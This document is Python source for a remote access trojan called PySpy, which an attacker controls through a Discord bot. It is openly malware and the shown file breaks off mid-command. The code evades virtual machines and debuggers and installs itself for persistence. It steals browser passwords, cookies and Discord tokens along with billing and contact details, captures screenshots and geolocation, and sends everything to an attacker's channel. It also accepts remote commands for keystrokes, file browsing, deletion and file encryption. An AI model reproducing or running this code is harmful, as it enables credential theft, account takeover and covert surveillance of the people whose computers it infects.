# This RAT (PySpy) was made by LunarrBlue on Github and should not be used to cause harm or damage to others. Please view the licence provided on Github.
# https://github.com/LunarrBlue/PySpy

import os
import platform
import psutil
import sys
import discord
import pyautogui
import numpy as np
import io
import json
import webbrowser
import base64
import re
from typing import Union
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import pyttsx3
import sqlite3
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
import shutil
from shutil import copy2
from getpass import getuser
from discord import Embed, File
import time
import requests
from requests import get
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import ctypes
from win32crypt import CryptUnprotectData

token = "{{token}}"
members = "{{members}}"
anti_vm = "{{vm}}"
password_en = "{{password}}"

current_dir = os.path.expanduser('~')

PREDEFINED_DIRS = {
    'home<': os.path.expanduser('~'),
    'desktop<': os.path.join(os.path.expanduser('~'), 'Desktop'),
    'downloads<': os.path.join(os.path.expanduser('~'), 'Downloads'),
    'documents<': os.path.join(os.path.expanduser('~'), 'Documents'),
    'pictures<': os.path.join(os.path.expanduser('~'), 'Pictures'),
    'music<': os.path.join(os.path.expanduser('~'), 'Music'),
    'videos<': os.path.join(os.path.expanduser('~'), 'Videos'),
    'temp<': os.path.join(os.getenv('TEMP', '/tmp')),
    'appdata<': os.getenv('APPDATA', ''),
    'localappdata<': os.getenv('LOCALAPPDATA', ''),
    'programfiles<': os.getenv('ProgramFiles', ''),
    'programfilesx86<': os.getenv('ProgramFiles(x86)', ''),
    'windows<': os.getenv('WINDIR', ''),
    'systemroot<': os.getenv('SystemRoot', ''),
    'system32<': os.path.join(os.getenv('SystemRoot', ''), 'System32'),
    'commonprogramfiles<': os.getenv('COMMONPROGRAMFILES', ''),
    'commonprogramfilesx86<': os.getenv('COMMONPROGRAMFILES(x86)', ''),
    'startup<': os.path.join(os.getenv('ALLUSERSPROFILE', ''), 'Start Menu', 'Programs', 'Startup'),
    'startmenu<': os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu'),
    'bin<': os.path.join(os.getenv('SystemDrive', 'C:'), '$Recycle.Bin'),
    'programdata<': os.getenv('PROGRAMDATA', '')
}

if anti_vm == "True":
    def protection_check():
        vm_files = [
            "C:\\windows\\system32\\vmGuestLib.dll",
            "C:\\windows\\system32\\vm3dgl.dll",
            "C:\\windows\\system32\\vboxhook.dll",
            "C:\\windows\\system32\\vboxmrxnp.dll",
            "C:\\windows\\system32\\vmsrvc.dll",
            "C:\\windows\\system32\\drivers\\vmsrvc.sys"
        ]
        blacklisted_processes = [
            'vmtoolsd.exe', 
            'vmwaretray.exe', 
            'vmwareuser.exe',
            'fakenet.exe', 
            'dumpcap.exe', 
            'httpdebuggerui.exe', 
            'wireshark.exe', 
            'fiddler.exe', 
            'vboxservice.exe', 
            'df5serv.exe', 
            'vboxtray.exe', 
            'vmwaretray.exe', 
            'ida64.exe', 
            'ollydbg.exe', 
            'pestudio.exe', 
            'vgauthservice.exe', 
            'vmacthlp.exe', 
            'x96dbg.exe', 
            'x32dbg.exe', 
            'prl_cc.exe', 
            'prl_tools.exe', 
            'xenservice.exe', 
            'qemu-ga.exe', 
            'joeboxcontrol.exe', 
            'ksdumperclient.exe', 
            'ksdumper.exe', 
            'joeboxserver.exe', 
        ]

        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'].lower() in [p.lower() for p in blacklisted_processes]:
                return True
        for file_path in vm_files:
            if os.path.exists(file_path):
                return True

        return False
        
    vm = protection_check()

    if vm:
        sys.exit()


intents = discord.Intents.all()

client = discord.Client(intents=intents)

total = []
sessions = 0

import discord

def grab_cookies():
    browser = Browsers()
    browser.grab_cookies()


def create_temp(_dir: Union[str, os.PathLike] = None) -> str:
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)    
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        temp_directory = os.path.expanduser("~/tmp")
        with open(os.path.join(temp_directory, "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)
        return
    
def add_to_startup():
    # Get the path to the startup folder
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')

    # Get the path to the current executable
    exe_path = sys.executable

    # Define the destination path in the startup folder
    dest_path = os.path.join(startup_folder, os.path.basename(exe_path))

    # Copy the executable to the startup folder
    if not os.path.exists(dest_path):
        shutil.copy(exe_path, dest_path)
        print(f"Copied {exe_path} to {dest_path}")
    else:
        print(f"{dest_path} already exists.")


async def send_embed(channel_id, title, description, color=2303786, image=None):
    # Get the channel object
    channel = client.get_channel(channel_id)
    if channel is None:
        print(f"Channel with ID {channel_id} not found.")
        return

    # Create an embed object
    embed = discord.Embed(title=title, description=description, color=color)
    
    # Prepare the file attachment if provided
    file = None
    if image:
        try:
            # Save the image to a BytesIO object
            with io.BytesIO() as image_file:
                image.save(image_file, format='PNG')
                image_file.seek(0)
                file = discord.File(image_file, filename="screenshot.png")  # Adjust the filename if needed
                # Add the image URL to the embed
                embed.set_image(url='attachment://screenshot.png')
        except Exception as e:
            print(f"Failed to process image: {e}")

    # Send the embed and optionally the file attachment
    if file:
        await channel.send(embed=embed, file=file)
    else:
        await channel.send(embed=embed)

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        return r.status_code == 200
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path): return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
        with open(path, "r", encoding="utf-8") as f: c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else: payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild['approximate_member_count'] >= int(members):
                        owner = 'Yes' if guild['owner'] else 'No'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                        else: invite = "Unavalable"
                        data = f"{guild['name']} ({guild['id']}):\n  Owner: {owner}\n  Members: {guild['approximate_member_count']}\n  Online: {guild['approximate_presence_count']}\n  Offline: {guild['approximate_member_count'] - guild['approximate_presence_count']}\n  Join Server --> {invite}"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                        hq_guilds.append(data)

                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds) 
                else: hq_guilds = None
            else: hq_guilds = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024: break
                    codes.append(data)
                if len(codes) > 0: codes = '\n\n'.join(codes)
                else: codes = None
            else: codes = None

            if not raw_data:
                embed = Embed(title=f"{username} ({user_id})", color=2303786)
                embed.set_thumbnail(url=avatar)

                embed.add_field(name="\u200b\n🎟️ Token:", value=f"```{token}```", inline=False)
                embed.add_field(name="**✨ Nitro:**", value=f"```{nitro}```", inline=False)
                embed.add_field(name="**💳 Billing:**", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=False)
                embed.add_field(name="**🔒 MFA:**", value=f"```{mfa}```", inline=False)
                
                embed.add_field(name="**🎁 Gift Codes:**", value=f"```{codes if codes != '' else 'None'}```", inline=False)
                embed.add_field(name="**👑 Server Info:**", value=f"```{hq_guilds if hq_guilds != '' else 'None'}```", inline=False)

                return embed
            else:
                final_to_return.append({
                    'username': username,
                    'user_id': user_id,
                    'email': email,
                    'phone': phone,
                    'avatar': avatar,
                    'nitro': nitro,
                    'payment_methods': payment_methods,
                    'mfa': mfa,
                    'codes': codes,
                    'hq_guilds': hq_guilds
                })

        if raw_data:
            with open('tokens.json', 'w') as f:
                json.dump(final_to_return, f, indent=4)
            return final_to_return
        return None

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = {}
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        print(e)
        pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
    cursor.close()
    db.close()
    try:
        os.remove(file_name)
    except:
        pass
    return result

def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    try:
        result = main()
    except:
        time.sleep(1)
    try:
        result2 = get_passwords_edge()
        for i in result2.keys():
            result[i] = result2[i]
    except:
        time.sleep(1)
    return result

async def send_dc_embed(channel_id):
    channel = client.get_channel(channel_id)
    fetch = fetch_tokens()
    embed = fetch.upload(raw_data=False)
    if embed:
        await channel.send(embed=embed)

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        ip_info = response.json()
        return ip_info['ip']
    except requests.RequestException as e:
        print(f"Error retrieving public IP: {e}")
        return None

async def show_message(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

async def ip_info(ip, arg):
    return get(f'https://ipapi.co/{ip}/{arg}/').text

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(path, password):
    try:
        # Read the file contents
        with open(path, 'rb') as file:
            data = file.read()
    except:
        print(f"The path \"{path}\" does not exist.")
        return

    try:
        # Generate a random salt and IV
        salt = os.urandom(16)
        iv = os.urandom(16)

        # Derive the key from the password and salt
        key = derive_key(password, salt)

        # Create AES cipher
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        # Pad the data to block size
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt the data
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Replace the file with the encrypted content (prepend salt and iv)
        with open(path, 'wb') as enc_file:
            enc_file.write(salt + iv + encrypted_data)
    except:
        print(f"Failed to encrypt \"{path}\"")

def decrypt_file(path, password):
    # Read the encrypted file contents
    try:
        with open(path, 'rb') as file:
            data = file.read()
    except:
        print(f"The path \"{path}\" does not exist.")
        return

    try:
        # Extract the salt, IV, and encrypted data
        salt = data[:16]
        iv = data[16:32]
        encrypted_data = data[32:]

        # Derive the key from the password and salt
        key = derive_key(password, salt)

        # Create AES cipher for decryption
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        # Decrypt the data
        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remove padding
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

        # Replace the encrypted file with the decrypted content
        with open(path, 'wb') as dec_file:
            dec_file.write(decrypted_data)
    except:
        print(f"Failed to decrypt \"{path}\"")
        return

add_to_startup()

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    global channel_name
    channel_name = None
    for x in client.get_all_channels():
        total.append(x.name)
    for y in range(len(total)):
        if total[y].startswith("session"):
            global sessions
            sessions += 1
        else:
            pass
    channel_name = f"session-{sessions}"
    newchannel = await client.guilds[0].create_text_channel(channel_name)
    global channel_
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = channel_.id
    global temp_directory
    temp_directory = os.getenv('TEMP')
    system = platform.system()
    node = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processer = platform.processor()
    architecture = platform.architecture()
    python = platform.python_version()
    physical_cores = psutil.cpu_count(logical=False)
    logical_cores = psutil.cpu_count(logical=True)
    freq = psutil.cpu_freq()
    current_freq = freq.current
    mem = psutil.virtual_memory()
    total_ram = mem.total
    total_ram_gb = total_ram / (1024 ** 3)
    disk = psutil.disk_usage('/')
    disk_used = disk.used / (1024 ** 3)
    disk_total = disk.total / (1024 ** 3)
    ip = get_public_ip()
    latlong = await ip_info(ip, "latlong")
    postal = await ip_info(ip, "postal")
    country = await ip_info(ip, "country_name")
    state = await ip_info(ip, "region")
    state_code = await ip_info(ip, "region_code")
    city = await ip_info(ip, "city")
    timezone = await ip_info(ip, "timezone")
    image = pyautogui.screenshot()

    buffer = io.BytesIO()
    image.save(buffer, format='PNG')
    buffer.seek(0)

    file = File(fp=buffer, filename='screenshot.png')

    fetch = fetch_tokens()
    new_embed = fetch.upload(raw_data=False)

    if new_embed:
        existing_embed = Embed(title=f"New Session Opened", description=f"**🖥️ System Information:**\n```System: {system}\nNode: {node}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcesser: {processer}\nArchitecture: {architecture}\nPython Version: {python}```\n**💽 Hardware Information:**\n```Physical CPU Cores: {physical_cores}\nLogical CPU Cores: {logical_cores}\nCPU Frequency: {round(current_freq)} MHz\nMemory: {round(total_ram_gb)} GB\nDisk Ussage: {str(round(disk_used)) + "/" + str(round(disk_total))}```\n**🛜 IP Information:**\n```IPv4: {ip}\nTimezone: {timezone}\nCountry: {country}\nState: {state} ({state_code})\nCity: {city}\nPostal Code: {postal}\nLatitude & Longitude: {latlong}```\n**🤖 Discord Information:**")
        
        if new_embed.description:
            existing_embed.description += f"{new_embed.description}"
        
        for field in new_embed.fields:
            existing_embed.add_field(name=field.name, value=field.value, inline=field.inline)
        
        if new_embed.footer:
            existing_embed.set_footer(text="PySpy || http://github.com/LunarrBlue/PySpy")

        existing_embed.set_image(url="attachment://screenshot.png")
        
        await channel_.send(embed=existing_embed, file=file)




@client.event
async def on_message(message):
    if not message.channel.name == channel_name:
        return

    # Command: screenshot
    elif message.content.lower() == '!screenshot':
        try:
            image = pyautogui.screenshot()
            await send_embed(message.channel.id, "Screenshot Taken", None, None, image)
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: type
    elif message.content.lower().startswith('!type'):
        try:
            pyautogui.write(message.content[6:])
            await send_embed(message.channel.id, f"Typed", f"Successfuly typed `{message.content[6:]}` on victums computer.", None)
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    #Command: passwords
    elif message.content.lower() == '!passwords':
        try:
            passwords = grab_passwords()
            if passwords:
                description = ""
                for url, creds in passwords.items():
                    username, password = creds
                    description += f"**URL:** {url}\n**Username:** {username}\n**Password:** {password}\n\n"
                
                embed = discord.Embed(title="Extracted Passwords", description=description)
                await message.channel.send(embed=embed)
            else:
                await send_embed(message.channel.id, "Error", "No passwords found.")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    #Command: exit
    elif message.content.lower() == '!exit':
        try:
            await channel_.delete()
            sys.exit()
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    #Command: message
    elif message.content.lower().startswith('!message'):
        try:
            _, title, msg = message.content.split(' ', 2)
            await show_message(title, msg)
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    #Command: discord
    elif message.content.lower() == '!discord':
        try:
            await send_dc_embed(message.channel.id)
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    #Command: cookies
    elif message.content.lower() == '!cookies':
        try:
            temp_directory = os.path.expanduser("~/tmp")
            cookies_path = os.path.join(temp_directory, "cookies.txt")

            grab_cookies()
            
            if os.path.exists(cookies_path):
                
                with open(cookies_path, 'rb') as file:
                    await message.channel.send(file=discord.File(file, 'cookies.txt'))
                
            else:
                await send_embed(message.channel.id, "Error", "No cookies found.")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: cd
    elif message.content.lower().startswith('!cd'):
        global current_dir
        directory = message.content[4:]

        try:
            if directory.lower() in PREDEFINED_DIRS:
                new_dir = PREDEFINED_DIRS[directory.lower()]
            else:
                new_dir = os.path.abspath(os.path.join(current_dir, directory))
            
            if os.path.isdir(new_dir):
                current_dir = new_dir
                await send_embed(message.channel.id, "Set Directory", f"Current directory has now been set to: ```{current_dir}```")
            else:
                await send_embed(message.channel.id, "Error", f"```The directory \"{new_dir}\" does not exist.```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: listdir
    elif message.content.lower() == '!listdir':
        current_dir
        try:
            files = os.listdir(current_dir)
            if files:
                await send_embed(message.channel.id, f"Contents of \"{current_dir}\"", '\n'.join(files))
            else:
                await send_embed(message.channel.id, "Error", f"```The directory \"{current_dir}\" is empty.```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: delete
    elif message.content.lower().startswith('!delete'):
        try:
            path = os.path.join(current_dir, message.content[8:])
            if os.path.exists(path):
                os.remove(path)
                await send_embed(message.channel.id, f"Deleted \"{message.content[8:]}\"", f"Deleted file \"{message.content[8:]}\" at path: ```{path}```")
            else:
                await send_embed(message.channel.id, "Error", f"```The file \"{message.content[8:]}\" does not exist in path {current_dir}```")
